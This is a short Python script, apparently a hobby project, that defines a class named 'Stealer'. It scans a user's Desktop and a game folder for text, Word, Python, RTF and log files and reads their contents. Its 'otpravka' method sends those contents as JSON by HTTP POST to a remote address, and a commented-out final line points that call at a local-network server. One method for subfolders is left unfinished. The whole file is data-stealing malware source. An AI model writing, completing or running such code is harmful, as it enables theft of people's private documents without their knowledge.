import requests as r
import os


class Stealer:

    def __init__(self, data: list):
        self.data_saves = {}
        self.data = data
        if type(data) != list:
            exit("")
        for i in self.data:
            dts = os.listdir(i)
            self.data_saves[f"{i}"] = []
            for j in dts:
                try:
                    if ".txt" in j or ".docx" in j or ".text" in j or ".doc" in j or ".py" in j or ".rtf" in j or ".log" in j:
                        self.data_saves[f"{i}"].append(j)
                except:
                    continue

    def save_data(self):
        hard_slv = {}
        for i in self.data_saves:
            hard_slv[f"{i}"] = {}
            for j in self.data_saves[i]:
                hard_slv[f"{i}"][f"{j}"] = []
                try:
                    with open(f"{i}\{j}", "r", encoding="UTF-8") as f:
                        tmp = f.read()
                    hard_slv[f"{i}"][f"{j}"].append(tmp)
                except UnicodeDecodeError:
                    continue
        return hard_slv

    def __is_papke(self, name):
        if os.path.isdir(name):
            return True
        else:
            return False

    def save_data_podkatalog(self):
        new_data = []
        for i in self.data:
            tmp=os.listdir(i)
            for j in tmp:
                if self.__is_papke(f"{i}\{j}") == True:
                   new_data.append(f"{i}\{j}")
       

    

    def otpravka(self, adr):
        r.post(adr, json=self. save_data())

    def get_data(self):
        return self.data_saves


s = Stealer(["C:\\Users\\D.A.R.K\\Desktop\\",
            "C:\\Users\D.A.R.K\\Documents\\Euro Truck Simulator 2"])
print(s.get_data())

print("-------------------------------------------------")
s.save_data_podkatalog()
print(s.get_data())
#s.otpravka(" http://192.168.0.14:5000/gfshjoifhugih/iidshfidhdfioidd/rrr345u8939f5876438dw/fcwef123")
